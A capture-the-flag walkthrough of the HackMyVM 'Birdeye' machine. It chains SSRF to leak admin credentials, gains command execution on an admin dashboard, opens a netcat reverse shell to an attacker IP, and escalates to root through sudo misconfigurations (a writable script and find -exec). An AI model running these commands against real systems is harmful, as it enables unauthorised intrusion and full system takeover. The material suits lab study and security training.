# Birdeye

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.173:53
Open 10.0.2.173:80
Open 10.0.2.173:5000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.173
PORT     STATE SERVICE REASON  VERSION
53/tcp   open  domain  syn-ack ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 8E3A10E157F75ADA21AB742C022D5430
|_http-title: client
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-cors: GET POST OPTIONS
5000/tcp open  http    syn-ack Werkzeug httpd 2.0.3 (Python 3.6.9)
|_http-server-header: Werkzeug/2.0.3 Python/3.6.9
|_http-title: 404 Not Found
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

We can search for products, but it's SSRF like API

![writeup.png](/assets/pentest/hackmyvm/birdeye/writeup.png)

```bash
└─$ php -r 'echo urldecode(fgets(STDIN));' <<<'http://10.0.2.173/api/fetch-url?url=http%3A%2F%2Flocalhost%3A5000%2Fapi%2Fproducts%2F%3Fsearch%3D%22Smart%22'
http://10.0.2.173/api/fetch-url?url=http://localhost:5000/api/products/?search="Smart"
```

The API is exposed so why SSRF like request?...
```bash
└─$ curl 'http://10.0.2.173:5000/api/products/?search="Smart"'
[{"description":"Track your fitness and notifications on the go.","id":2,"image":"https://images.unsplash.com/photo-1519125323398-675f0ddb6308","name":"Smart Watch","price":149.99}]
```

### SQLi (Test)

```bash
└─$ curl "http://10.0.2.173:5000/api/products/" -G --data-urlencode "?search=Smart' OR  1=1 -- -"
[{"description":"High quality wireless headphones with noise cancellation.","id":1,"image":"https://images.unsplash.com/photo-1517336714731-489689fd1ca8","name":"Wireless Headphones","price":99.99},{"description":"Track your fitness and notifications on the go.","id":2,"image":"https://images.unsplash.com/photo-1519125323398-675f0ddb6308","name":"Smart Watch","price":149.99},{"description":"Portable speaker with deep bass and long battery life.","id":3,"image":"https://images.unsplash.com/photo-1465101046530-73398c7f28ca","name":"Bluetooth Speaker","price":59.99},{"description":"Read your favorite books anywhere, anytime.","id":4,"image":"https://images.unsplash.com/photo-1512820790803-83ca734da794","name":"E-reader","price":129.99}]
```

```bash
└─$ sqlmap -u 'http://10.0.2.173:5000/api/products/?search=*' --batch --risk 3 --level 5 --current-db
[02:11:41] [WARNING] URI parameter '#1*' does not seem to be injectable
```

If no matching product is found it just returns everything
```bash
└─$ curl "http://10.0.2.173:5000/api/products/" -G --data-urlencode "?search=x" -s | jq 'length'
4

└─$ curl "http://10.0.2.173:5000/api/products/" -G --data-urlencode "?search='" -s | jq 'length'
4

└─$ curl "http://10.0.2.173:5000/api/products/" -G --data-urlencode "?search=" -s | jq 'length'
4

└─$ curl "http://10.0.2.173:5000/api/products/" -G --data-urlencode "?search=' AND 2=1 -- -" -s | jq 'length'
4
```

### SSRF

```bash
└─$ ffuf -u 'http://10.0.2.173/api/fetch-url?url=http://localhost:FUZZ' -w <(seq 1 10000) -mc all -fr 'Error: HTTPConnectionPool'
80                      [Status: 200, Size: 288, Words: 38, Lines: 8, Duration: 357ms]
953                     [Status: 500, Size: 85, Words: 8, Lines: 1, Duration: 353ms]
5000                    [Status: 404, Size: 232, Words: 31, Lines: 5, Duration: 623ms]
```

```bash
└─$ curl 'http://10.0.2.173/api/fetch-url?url=http://localhost:953'
Error: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer')) 
```

```bash
└─$ feroxbuster -u http://10.0.2.173:5000 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
308      GET        4l       24w      264c http://10.0.2.173:5000/admin => http://10.0.2.173:5000/admin/

└─$ feroxbuster -u http://10.0.2.173:5000/api --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
308      GET        4l       24w      278c http://10.0.2.173:5000/api/products => http://10.0.2.173:5000/api/products/

└─$ feroxbuster -u http://10.0.2.173:5000/api --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
308      GET        4l       24w      278c http://10.0.2.173:5000/api/products => http://10.0.2.173:5000/api/products/
```

```bash
└─$ ffuf -u 'http://10.0.2.173/api/fetch-url?url=http://localhost:5000/admin/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fs 22
config                  [Status: 200, Size: 106, Words: 1, Lines: 2, Duration: 487ms]
dashboard               [Status: 401, Size: 25, Words: 1, Lines: 2, Duration: 444ms]
```

```bash
└─$ curl 'http://10.0.2.173/api/fetch-url?url=http://localhost:5000/admin/config'
{"admin_password":"SuperSecret123!","admin_user":"superadmin","login_panel_path":"/admin/panelloginpage"}
```

To login we need a POST request, however the api makes GET. Luckily API has `method` parameter to change method type.

![writeup-1.png](/assets/pentest/hackmyvm/birdeye/writeup-1.png)

![writeup-2.png](/assets/pentest/hackmyvm/birdeye/writeup-2.png)

### RCE

After many tries and different variations always same output
```bash
└─$ curl 'http://10.0.2.173/api/fetch-url?url=http://localhost:5000/admin/dashboard&method=POST&cookies=session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aVoZkA.FXdwdQMrRcBYc-YT-PJZkRFKCFQ;' -b 'session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aVoZkA.FXdwdQMrRcBYc-YT-PJZkRFKCFQ;' -d 'command=id'
{"error":"Unauthorized"}
```

With cookie we can directly access the **dashboard** without SSRF
```bash
└─$ curl 'http://10.0.2.173/admin/dashboard' -b 'session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aVoZkA.FXdwdQMrRcBYc-YT-PJZkRFKCFQ;' -d 'command=id' -is | htmlq pre -tw
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
└─$ curl 'http://10.0.2.173/admin/dashboard' -b 'session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aVoZkA.FXdwdQMrRcBYc-YT-PJZkRFKCFQ;' --data-urlencode 'command=busybox nc 10.0.2.149 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@birdeye:~/birdeye/Server$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (sev)

```bash
www-data@birdeye:~/birdeye$ sudo -l
Matching Defaults entries for www-data on birdeye:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on birdeye:
    (sev) NOPASSWD: /home/sev/backup_app.sh
```

Nani?!
```bash
www-data@birdeye:~/birdeye$ ls -l /home/sev/backup_app.sh
-rwxrwxrwx 1 sev sev 25 Oct  4 19:41 /home/sev/backup_app.sh
www-data@birdeye:~/birdeye$ cat /home/sev/backup_app.sh
#!/bin/bash
/bin/bash -p
```

```bash
sev@birdeye:~/birdeye$ id
uid=1000(sev) gid=1000(sev) groups=1000(sev),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),112(lpadmin),113(sambashare),999(vboxsf)
```

### User.txt

```bash
sev@birdeye:/home/sev$ cat user.txt
FLAG{wwwd4t4_t0_s3v_3sc4l4t10n}
```

## Privilege Escalation

```bash
sev@birdeye:/$ sudo -l
Matching Defaults entries for sev on birdeye:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sev may run the following commands on birdeye:
    (ALL) NOPASSWD: /usr/bin/find
```

```bash
sev@birdeye:/home/sev$ sudo find /bin/bash -exec sh -c '/bin/bash -p' \;
root@birdeye:/home/sev# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@birdeye:/home/sev# cat /root/root.txt
FLAG{5ev1l_r00t_4cc3ss_4ch13v3d}
```